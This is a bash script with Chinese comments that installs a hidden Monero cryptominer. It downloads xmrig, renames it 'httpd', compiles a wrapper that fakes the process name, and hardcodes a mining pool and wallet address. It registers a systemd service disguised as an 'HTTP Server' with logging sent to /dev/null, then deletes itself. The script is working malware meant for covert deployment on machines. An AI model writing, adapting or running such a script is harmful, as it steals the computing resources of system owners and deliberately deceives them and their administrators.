#!/bin/bash

# 隐藏进程及其特征的一键部署脚本

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查依赖
for cmd in curl tar gcc systemctl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

# 用户输入矿池 URL 和钱包地址
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入采矿服务器密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 创建目录
mkdir -p /opt/utils /etc/systemd/system/conf.d || { echo "创建目录失败" 1>&2; exit 1; }

# 下载并安装 xmrig
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/utils || { echo "下载或解压失败" 1>&2; exit 1; }
mv /opt/utils/xmrig-6.22.2/xmrig /opt/utils/httpd || { echo "移动文件失败" 1>&2; exit 1; }
chmod +x /opt/utils/httpd
rm -rf /opt/utils/xmrig-6.22.2

# 创建 wrapper 以伪装进程名
cat > /opt/utils/wrapper.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "httpd", 0, 0, 0); // 伪装成 httpd 进程
    execv("/opt/utils/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/utils/wrapper /opt/utils/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
rm /opt/utils/wrapper.c

# 生成配置文件
cat > /etc/systemd/system/conf.d/httpd.conf <<EOF
{
    "cpu": {
        "threads": 7
    },
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false
}
EOF

# 检查 httpd 用户和组是否存在
if ! id "httpd" &>/dev/null; then
    # 如果用户不存在，创建用户和组
    if ! getent group "httpd" &>/dev/null; then
        groupadd -r httpd || { echo "创建组 httpd 失败" 1>&2; exit 1; }
    fi
    useradd -r -s /bin/false -g httpd httpd || { echo "创建用户 httpd 失败" 1>&2; exit 1; }
else
    echo "用户 httpd 已存在，跳过创建步骤"
fi

# 创建 systemd 服务文件
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
ExecStart=/opt/utils/wrapper --config=/etc/systemd/system/conf.d/httpd.conf --no-color --log-file=/dev/null --threads=1
Restart=always
CPUQuota=80%  # 限制 CPU 使用率为 50%

[Install]
WantedBy=multi-user.target
EOF

# 启用并启动服务
systemctl daemon-reload
systemctl enable httpd.service
systemctl start httpd.service || { echo "服务启动失败" 1>&2; exit 1; }

# 删除脚本自身
rm -- "$0"
echo "部署完成！"
